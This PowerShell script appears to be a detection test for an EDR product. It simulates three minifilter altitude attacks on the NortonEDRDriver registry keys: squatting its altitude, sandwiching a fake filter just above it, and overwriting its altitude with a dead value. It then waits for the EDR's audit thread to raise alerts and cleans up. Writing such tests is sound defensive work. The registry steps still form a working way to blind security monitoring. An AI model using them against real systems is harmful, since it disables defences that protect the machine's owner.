#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Proof-of-concept: minifilter altitude squatting and sandwiching attack.

.DESCRIPTION
    Simulates three attack scenarios against the NortonEDR minifilter:

      1) SQUAT   - Register a fake service at the exact same altitude (320021)
                   so NortonEDR fails to attach on next boot / service restart.

      2) SANDWICH - Register a fake filter at altitude 320022 (just above us)
                    so an attacker's filter sees all I/O before NortonEDR does.

      3) TAMPER   - Overwrite NortonEDR's own altitude registry value to a
                    dead altitude (999999) so it attaches in the wrong place.

    Each scenario writes the registry keys, pauses for the user-mode audit
    thread to detect them (~30s cycle), then cleans up.

    No actual kernel driver is loaded -- only the registry footprint is planted,
    which is sufficient to trigger both the user-mode AltitudeAuditThread and
    to validate that the kernel-side FsFilter::Init check would fire on reboot.

.PARAMETER Scenario
    Which attack to simulate: Squat, Sandwich, Tamper, or All (default).

.PARAMETER WaitSeconds
    How long to leave the malicious keys in place before cleanup (default 45).

.PARAMETER NoCleanup
    Leave the malicious keys in place (for manual inspection). You must run
    the script again with -Cleanup to remove them.

.PARAMETER Cleanup
    Remove any leftover keys from a previous -NoCleanup run.

.EXAMPLE
    .\Test-AltitudeSquat.ps1 -Scenario All
    .\Test-AltitudeSquat.ps1 -Scenario Squat -WaitSeconds 60
    .\Test-AltitudeSquat.ps1 -Cleanup
#>
[CmdletBinding(DefaultParameterSetName = 'Run')]
param(
    [Parameter(ParameterSetName = 'Run')]
    [ValidateSet('Squat', 'Sandwich', 'Tamper', 'All')]
    [string]$Scenario = 'All',

    [Parameter(ParameterSetName = 'Run')]
    [int]$WaitSeconds = 45,

    [Parameter(ParameterSetName = 'Run')]
    [switch]$NoCleanup,

    [Parameter(ParameterSetName = 'Cleanup')]
    [switch]$Cleanup
)

$ErrorActionPreference = 'Stop'

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
$TargetAltitude    = '320021'
$SandwichAltitude  = '320022'
$DeadAltitude      = '999999'
$FakeSvcSquat      = 'FakeFilterSquat'
$FakeSvcSandwich   = 'FakeFilterSandwich'
$ServicesRoot      = 'HKLM:\SYSTEM\CurrentControlSet\Services'
$NortonInstKey     = "$ServicesRoot\NortonEDRDriver\Instances\NortonEDRDrvInstance"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function New-FakeFilterKeys {
    param(
        [string]$ServiceName,
        [string]$Altitude,
        [string]$Label
    )

    $svcPath  = "$ServicesRoot\$ServiceName"
    $instRoot = "$svcPath\Instances"
    $instKey  = "$instRoot\${ServiceName}Instance"

    Write-Host "[*] $Label : creating $ServiceName at altitude $Altitude" -ForegroundColor Yellow

    # Service key (minimal — just enough for the registry scanner to find it)
    if (-not (Test-Path $svcPath)) {
        New-Item -Path $svcPath -Force | Out-Null
    }
    Set-ItemProperty -Path $svcPath -Name 'Type'           -Value 2          -Type DWord   # SERVICE_FILE_SYSTEM_DRIVER
    Set-ItemProperty -Path $svcPath -Name 'Start'          -Value 3          -Type DWord   # DEMAND_START
    Set-ItemProperty -Path $svcPath -Name 'ImagePath'      -Value "system32\drivers\$ServiceName.sys" -Type ExpandString

    # Instance keys
    if (-not (Test-Path $instRoot)) {
        New-Item -Path $instRoot -Force | Out-Null
    }
    Set-ItemProperty -Path $instRoot -Name 'DefaultInstance' -Value "${ServiceName}Instance" -Type String

    if (-not (Test-Path $instKey)) {
        New-Item -Path $instKey -Force | Out-Null
    }
    Set-ItemProperty -Path $instKey -Name 'Altitude' -Value $Altitude -Type String
    Set-ItemProperty -Path $instKey -Name 'Flags'    -Value 0         -Type DWord

    Write-Host "[+] $Label : registry keys written" -ForegroundColor Green
}

function Remove-FakeFilterKeys {
    param([string]$ServiceName)

    $svcPath = "$ServicesRoot\$ServiceName"
    if (Test-Path $svcPath) {
        Remove-Item -Path $svcPath -Recurse -Force
        Write-Host "[-] Removed $svcPath" -ForegroundColor Cyan
    }
}

function Backup-NortonAltitude {
    if (Test-Path $NortonInstKey) {
        $current = (Get-ItemProperty -Path $NortonInstKey -Name 'Altitude' -ErrorAction SilentlyContinue).Altitude
        if ($current) {
            return $current
        }
    }
    return $null
}

function Restore-NortonAltitude {
    param([string]$Original)
    if ($Original -and (Test-Path $NortonInstKey)) {
        Set-ItemProperty -Path $NortonInstKey -Name 'Altitude' -Value $Original -Type String
        Write-Host "[+] Restored NortonEDR altitude to '$Original'" -ForegroundColor Green
    }
}

# ---------------------------------------------------------------------------
# Cleanup mode
# ---------------------------------------------------------------------------
if ($Cleanup) {
    Write-Host "`n=== Cleanup ===" -ForegroundColor Cyan
    Remove-FakeFilterKeys $FakeSvcSquat
    Remove-FakeFilterKeys $FakeSvcSandwich

    # Restore NortonEDR altitude if it was tampered
    if (Test-Path $NortonInstKey) {
        $current = (Get-ItemProperty -Path $NortonInstKey -Name 'Altitude' -ErrorAction SilentlyContinue).Altitude
        if ($current -ne $TargetAltitude) {
            Set-ItemProperty -Path $NortonInstKey -Name 'Altitude' -Value $TargetAltitude -Type String
            Write-Host "[+] Restored NortonEDR altitude from '$current' to '$TargetAltitude'" -ForegroundColor Green
        }
        else {
            Write-Host "[=] NortonEDR altitude is already correct ($TargetAltitude)" -ForegroundColor Gray
        }
    }
    Write-Host "Done.`n"
    return
}

# ---------------------------------------------------------------------------
# Attack simulation
# ---------------------------------------------------------------------------
Write-Host ""
Write-Host "============================================================" -ForegroundColor Red
Write-Host "  Minifilter Altitude Attack PoC                           " -ForegroundColor Red
Write-Host "  Target: NortonEDRDriver (altitude $TargetAltitude)              " -ForegroundColor Red
Write-Host "============================================================" -ForegroundColor Red
Write-Host ""

$scenarios = if ($Scenario -eq 'All') { @('Squat', 'Sandwich', 'Tamper') } else { @($Scenario) }
$originalAltitude = $null

foreach ($s in $scenarios) {
    switch ($s) {
        'Squat' {
            Write-Host "`n--- Scenario 1: Altitude Squatting ---" -ForegroundColor Yellow
            Write-Host "Registering fake minifilter at EXACT same altitude ($TargetAltitude)."
            Write-Host "On next boot, NortonEDR would get STATUS_FLT_INSTANCE_ALTITUDE_COLLISION.`n"
            New-FakeFilterKeys -ServiceName $FakeSvcSquat -Altitude $TargetAltitude -Label 'SQUAT'
        }

        'Sandwich' {
            Write-Host "`n--- Scenario 2: Altitude Sandwiching ---" -ForegroundColor Yellow
            Write-Host "Registering fake minifilter at altitude $SandwichAltitude (just above $TargetAltitude)."
            Write-Host "This filter would see all I/O BEFORE NortonEDR and could hide malicious activity.`n"
            New-FakeFilterKeys -ServiceName $FakeSvcSandwich -Altitude $SandwichAltitude -Label 'SANDWICH'
        }

        'Tamper' {
            Write-Host "`n--- Scenario 3: Altitude Tamper ---" -ForegroundColor Yellow
            $originalAltitude = Backup-NortonAltitude
            if (-not $originalAltitude) {
                Write-Host "[!] NortonEDR instance key not found �� skipping tamper scenario." -ForegroundColor Red
                Write-Host "    (Is the driver installed? Run the user-mode service first.)`n"
                continue
            }
            Write-Host "Overwriting NortonEDR altitude from '$originalAltitude' to dead altitude '$DeadAltitude'."
            Write-Host "The minifilter would attach at the wrong stack position.`n"
            Set-ItemProperty -Path $NortonInstKey -Name 'Altitude' -Value $DeadAltitude -Type String
            Write-Host "[+] TAMPER: NortonEDR altitude overwritten to '$DeadAltitude'" -ForegroundColor Green
        }
    }
}

# ---------------------------------------------------------------------------
# Wait for detection
# ---------------------------------------------------------------------------
Write-Host ""
if ($NoCleanup) {
    Write-Host "[!] -NoCleanup specified. Keys left in place for manual inspection." -ForegroundColor Magenta
    Write-Host "    Run: .\Test-AltitudeSquat.ps1 -Cleanup  to remove them.`n"
}
else {
    Write-Host "[*] Waiting $WaitSeconds seconds for the AltitudeAuditThread to detect..." -ForegroundColor Cyan
    Write-Host "    (The user-mode audit runs every ~30s. Check the Detection Events tab.)`n"

    $elapsed = 0
    while ($elapsed -lt $WaitSeconds) {
        $remaining = $WaitSeconds - $elapsed
        Write-Progress -Activity "Altitude attack active" `
                       -Status "$remaining seconds remaining before cleanup" `
                       -PercentComplete (($elapsed / $WaitSeconds) * 100)
        Start-Sleep -Seconds 1
        $elapsed++
    }
    Write-Progress -Activity "Altitude attack active" -Completed

    # Cleanup
    Write-Host "`n=== Cleaning up ===" -ForegroundColor Cyan

    if ($scenarios -contains 'Squat') {
        Remove-FakeFilterKeys $FakeSvcSquat
    }
    if ($scenarios -contains 'Sandwich') {
        Remove-FakeFilterKeys $FakeSvcSandwich
    }
    if ($scenarios -contains 'Tamper' -and $originalAltitude) {
        Restore-NortonAltitude $originalAltitude
    }
}

Write-Host "`n=== Summary ===" -ForegroundColor Green
Write-Host "Scenarios executed: $($scenarios -join ', ')"
Write-Host "Expected detections in NortonEDR:"
if ($scenarios -contains 'Squat') {
    Write-Host "  [CRITICAL] Minifilter altitude SQUATTING detected (FakeFilterSquat @ $TargetAltitude)"
}
if ($scenarios -contains 'Sandwich') {
    Write-Host "  [CRITICAL] Minifilter altitude SANDWICHING detected (FakeFilterSandwich @ $SandwichAltitude)"
}
if ($scenarios -contains 'Tamper') {
    Write-Host "  [CRITICAL] Minifilter altitude registry tampered (320021 -> $DeadAltitude)"
}
Write-Host ""
